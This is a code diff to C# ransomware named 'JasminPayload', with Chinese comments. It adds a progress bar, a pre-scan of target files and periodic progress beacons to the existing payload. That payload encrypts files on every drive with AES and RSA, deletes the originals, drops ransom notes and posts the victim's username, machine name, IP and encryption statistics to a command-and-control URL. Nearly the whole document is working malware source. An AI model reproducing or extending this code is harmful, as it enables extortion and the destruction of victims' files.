@@ -8,12 +8,16 @@ using System.Security.Cryptography;
 using System.Threading;
 using System.Collections.Generic;
 using System.Management;
+using System.Runtime.InteropServices;
 
 namespace JasminPayload {
 class P {
 static string C2="{{C2_URL}}";
 static string SECRET="{{HANDSHAKE}}";
 static string PUB=@"{{RSA_PUBLIC_KEY}}";
+
+[DllImport("kernel32.dll")] static extern bool AttachConsole(int dwProcessId);
+[DllImport("kernel32.dll")] static extern bool FreeConsole();
 
 static string[] SKIP_DIRS={@"\Windows",@"\Program Files",@"\Program Files (x86)",
   @"\ProgramData",@"\$Recycle.Bin",@"\System Volume Information",
@@ -44,10 +48,10 @@ static byte[] AesEnc(byte[] data,byte[] key,byte[] iv){
 static byte[] RsaEnc(byte[] data){
   using(var rsa=RSA.Create()){rsa.ImportFromPem(PUB);return rsa.Encrypt(data,RSAEncryptionPadding.OaepSHA256);}}
 
-static void Enc(string path){
+static bool Enc(string path){
   try{
-    if(Skip(path))return;
-    byte[] p=File.ReadAllBytes(path);if(p.Length==0)return;
+    if(Skip(path))return false;
+    byte[] p=File.ReadAllBytes(path);if(p.Length==0)return false;
     byte[] h;using(var s=SHA256.Create())h=s.ComputeHash(p);
     byte[] k=new byte[32],iv=new byte[16];
     using(var rng=RandomNumberGenerator.Create()){rng.GetBytes(k);rng.GetBytes(iv);}
@@ -58,9 +62,59 @@ static void Enc(string path){
       fs.Write(h,0,32);fs.Write(ct,0,ct.Length);fs.Write(ek,0,ek.Length);
       fs.Write(BitConverter.GetBytes(ek.Length),0,4);}
     File.Delete(path);
-  }catch{}}
+    return true;
+  }catch{return false;}}
 
-static void Beacon(int cnt=0,long sz=0,string types="",string detail="{}"){
+// ── 进度条 ──
+static long P_DONE=0, P_BYTES=0, P_OK=0;
+static long P_TOTAL=0, P_TOTAL_BYTES=0;
+static long P_LAST_BEACON=0;
+static bool P_CONSOLE=false;
+static object P_LK=new object();
+
+static string FmtB(long b){
+  string[] u={"B","KB","MB","GB","TB","PB"};
+  double d=b;int i=0;
+  while(d>=1024 && i<5){d/=1024;i++;}
+  return i==0?((long)d)+u[i]:d.ToString("0.00")+u[i];
+}
+
+static void DrawBar(string cur){
+  if(!P_CONSOLE)return;
+  double pct = P_TOTAL_BYTES>0 ? (P_BYTES*100.0/P_TOTAL_BYTES)
+             : (P_TOTAL>0 ? (P_DONE*100.0/P_TOTAL) : 100.0);
+  if(pct>100)pct=100;
+  int barw=28, fill=(int)(pct*barw/100);
+  string bar=new string('█',fill)+new string('░',barw-fill);
+  if(cur!=null && cur.Length>34)cur="…"+cur.Substring(cur.Length-33);
+  try{
+    int cols=100;try{cols=Console.WindowWidth;}catch{}
+    string line=string.Format("  [{0}] {1,5:0.0}%  {2}/{3}  {4}/{5}  {6}",
+      bar,pct,P_DONE,P_TOTAL,FmtB(P_BYTES),FmtB(P_TOTAL_BYTES),cur??"");
+    if(line.Length>cols-1)line=line.Substring(0,cols-1);
+    Console.Error.Write("\r"+line);
+    Console.Error.Flush();
+  }catch{}
+}
+
+static void Tick(string path,long size,bool ok){
+  long done,bytes,total,tb;
+  lock(P_LK){
+    P_DONE++;P_BYTES+=size;if(ok)P_OK++;
+    done=P_DONE;bytes=P_BYTES;total=P_TOTAL;tb=P_TOTAL_BYTES;
+  }
+  DrawBar(path);
+  long now=DateTime.UtcNow.Ticks/TimeSpan.TicksPerSecond;  // 兼容 .NET 4.0+（不用 ToUnixTimeSeconds）
+  if(now-P_LAST_BEACON>=8){
+    P_LAST_BEACON=now;
+    // 周期性回传进度（后台，不阻塞加密）
+    int d=(int)done,okc=(int)P_OK,tc=(int)total;
+    long by=bytes,tbs=tb;
+    System.Threading.Tasks.Task.Run(()=>Beacon(d,by,"","{}",false,tc,tbs));
+  }
+}
+
+static void Beacon(int cnt=0,long sz=0,string types="",string detail="{}",bool complete=true,int totalCnt=0,long totalSz=0){
   try{
     string u=Environment.UserName,m=Environment.MachineName;
     string t=DateTime.Now.ToString("HH:mm:ss"),d=DateTime.Today.ToString("dd/MM/yyyy")+", "+DateTime.Now.DayOfWeek;
@@ -71,7 +125,10 @@ static void Beacon(int cnt=0,long sz=0,string types="",string detail="{}"){
       new("os","Windows "+Environment.OSVersion.Version),new("date",d),new("time",t),
       new("ip",ip),new("location","?"),new("password","RSA_PROTECTED"),new("handshake",SECRET),
       new("encrypted_count",cnt.ToString()),new("encrypted_size",sz.ToString()),
-      new("encrypted_types",types),new("encrypted_detail",detail)};
+      new("encrypted_types",types),new("encrypted_detail",detail),
+      new("is_complete",complete?"1":"0"),
+      new("total_count",(totalCnt>0?totalCnt:cnt).ToString()),
+      new("total_size",(totalSz>0?totalSz:sz).ToString())};
     c.PostAsync(C2,new FormUrlEncodedContent(kv)).Wait();
   }catch{}}
 
@@ -92,27 +149,49 @@ static void DropNotes(){
     try{File.WriteAllText(dr.Name+"READ_ME_解密教程.txt",txt);}catch{}}
 }
 
+// ── 预扫描：只统计数量与总字节，不保存路径列表 ──
+static void ScanTargets(){
+  try{P_CONSOLE=AttachConsole(-1);}catch{P_CONSOLE=false;}
+  foreach(var dr in DriveInfo.GetDrives()){
+    try{foreach(string ext in EXTS){
+      try{foreach(string f in Directory.EnumerateFiles(dr.Name,ext,SearchOption.AllDirectories)){
+        if(Skip(f))continue;
+        long fsz=0;try{fsz=new FileInfo(f).Length;}catch{}
+        P_TOTAL++;P_TOTAL_BYTES+=fsz;
+      }}catch{}}}catch{}}
+}
+
 static void Main(){
   try{var mc=new ManagementClass("Win32_LogicalDisk");
     foreach(ManagementObject o in mc.GetInstances())SID+=Convert.ToString(o["VolumeSerialNumber"]);}catch{}
-  int encCount=0; long encSize=0;
+
+  ScanTargets();
+  if(P_CONSOLE){try{Console.Error.WriteLine("[jasmin] 发现 "+P_TOTAL+" 个目标文件，合计 "+FmtB(P_TOTAL_BYTES));}catch{}}
+
+  long encCount=0,encSize=0;
   var encTypes=new System.Collections.Generic.HashSet<string>();
   var typeSizes=new System.Collections.Generic.Dictionary<string,long[]>();
   var tasks=new System.Collections.Generic.List<System.Threading.Tasks.Task>();
   object lk=new object();
+
   foreach(var dr in DriveInfo.GetDrives()){
     try{foreach(string ext in EXTS){
       try{foreach(string f in Directory.EnumerateFiles(dr.Name,ext,SearchOption.AllDirectories)){
+        if(Skip(f))continue;
         long fsz=0;try{fsz=new FileInfo(f).Length;}catch{}
         string fc=f;long fszc=fsz;
         tasks.Add(System.Threading.Tasks.Task.Run(()=>{
-          if(Enc(fc)){lock(lk){encCount++;encSize+=fszc;
+          bool ok=Enc(fc);
+          Tick(fc,fszc,ok);
+          if(ok){lock(lk){encCount++;encSize+=fszc;
             string e=Path.GetExtension(fc).ToLower();encTypes.Add(e);
             if(!typeSizes.ContainsKey(e))typeSizes[e]=new long[]{0,0};
             typeSizes[e][0]++;typeSizes[e][1]+=fszc;}}
         }));
       }}catch{}}}catch{}}
   System.Threading.Tasks.Task.WaitAll(tasks.ToArray());
+  if(P_CONSOLE){try{Console.Error.WriteLine();Console.Error.WriteLine("[jasmin] 加密完成: "+P_TOTAL+" 个文件, "+FmtB(P_TOTAL_BYTES));}catch{}}
+
   DropNotes();
   // 构建detail JSON
   var sb=new System.Text.StringBuilder("{");
@@ -122,5 +201,6 @@ static void Main(){
     sb.Append($"\"{kv2.Key}\":{{\"count\":{kv2.Value[0]},\"size\":{kv2.Value[1]}}}");
     first=false;}
   sb.Append("}");
-  Beacon(encCount,encSize,string.Join(",",encTypes),sb.ToString());
+  Beacon((int)encCount,encSize,string.Join(",",encTypes),sb.ToString(),true,(int)P_TOTAL,P_TOTAL_BYTES);
+  try{if(P_CONSOLE)FreeConsole();}catch{}
 }}} // end class, namespace
